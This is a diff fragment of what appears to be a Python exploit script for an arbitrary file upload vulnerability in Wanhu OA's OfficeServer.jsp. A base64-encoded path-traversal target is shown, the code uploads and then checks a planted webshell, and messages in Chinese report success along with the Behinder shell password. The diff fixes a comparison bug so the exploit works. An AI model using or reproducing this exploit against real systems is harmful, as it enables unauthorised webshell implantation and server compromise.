@@ -37,8 +37,7 @@ FILETYPE=Li4vLi4vcHVibGljL2VkaXQvY21kX3Rlc3QuanNw
         upload = requests.post(exp_url, headers=headers, data=data, verify=False)
         shell=requests.get(shell_url,headers=headerx,verify=False)
         if upload.status_code == 200:
-            if shell.status_code=200:
-            
+            if shell.status_code==200:
                 console.print(now_time() + ' [SUCCESS]  上传webshell成功，默认冰蝎密码:{}'.format(shell_url), style='bold green')
             else:
                 console.print(now_time() + ' [WARNING]  万户OA OfficeServer.jsp 任意文件上传漏洞不存在', style='bold red ')
